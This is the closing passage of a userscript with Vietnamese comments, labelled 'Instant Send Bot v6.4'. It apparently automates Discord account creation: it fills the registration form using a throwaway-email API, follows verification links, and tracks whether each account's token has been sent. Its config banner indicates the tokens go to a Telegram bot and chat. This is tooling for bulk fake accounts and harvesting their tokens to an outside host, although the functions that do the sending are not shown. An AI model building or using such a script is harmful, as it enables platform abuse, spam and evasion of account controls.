  const init = () => {
    // Hiển thị thông tin cấu hình
    console.log(`
╔══════════════════════════════════════════╗
║     🤖 INSTANT SEND BOT v6.4 CONFIG      ║
╠══════════════════════════════════════════╣
║ ⚡ Send Mode: INSTANT (1 token = send)
║ 📤 Auto-send: ${AUTO_SEND_ENABLED ? 'ENABLED' : 'DISABLED'}
║ ⏸️ Auto Reset: DISABLED (manual only)
║ 📧 Email API: orifymail.com
║ 📊 Accounts Created: ${accountCounter}
║ 🤖 Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}
║ 👤 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ SET' : '❌ NOT SET'}
║ 🎯 Panel: DRAGGABLE ENABLED
╚══════════════════════════════════════════╝
    `);
    
    // Kiểm tra cấu hình Telegram
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" ||
        !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
      notify("⚠️ Chưa cấu hình Telegram bot!", 'warning');
    } else {
      notify("🤖 Instant Send Bot v6.4 (No Auto Reset) đã sẵn sàng!", 'success');
    }
    
    // Tạo panel
    createControlPanel();
    
    // Cập nhật panel mỗi giây
    setInterval(() => {
      updateAccountCounter();
    }, 1000);
  };
  
  // ========== LOGIC CHÍNH ==========
  init();
  
  const url = window.location.href;
  
  if (url.includes('/register')) {
    const interval = setInterval(() => {
      const emailInput = document.querySelector('input[type="email"][aria-label="Email"],input[name="email"]');
      if (emailInput) {
        clearInterval(interval);
        setTimeout(() => fillFormWithDelay(), 1000);
      }
    }, 1000);
  }
  else if (url.includes('click.discord.com')) {
    currentEmail = GM_getValue('discord_current_email', '');
    currentUsername = GM_getValue('discord_current_username', '');
    tokenSent = GM_getValue('discord_token_sent', false);
    isVerifying = GM_getValue('discord_is_verifying', false);
    verifyStep = GM_getValue('discord_verify_step', 0);

    setTimeout(() => handleVerifyLink(), 1000);
  }
  else if (url.includes('/channels/') || url.includes('/app')) {
    currentEmail = GM_getValue('discord_current_email', '');
    currentUsername = GM_getValue('discord_current_username', '');
    tokenSent = GM_getValue('discord_token_sent', false);
    isVerifying = GM_getValue('discord_is_verifying', false);
    verifyStep = GM_getValue('discord_verify_step', 0);

    if (currentEmail && currentUsername) {
      if (!tokenSent && !isVerifying) {
        setTimeout(autoVerify, 5000);
      } else if (isVerifying) {
        if (verifyStep === 4 || verifyStep === 5) {
          setTimeout(checkLogin, 3000);
        }
      }
    }

    setTimeout(checkLogin, 5000);
  }
  
})();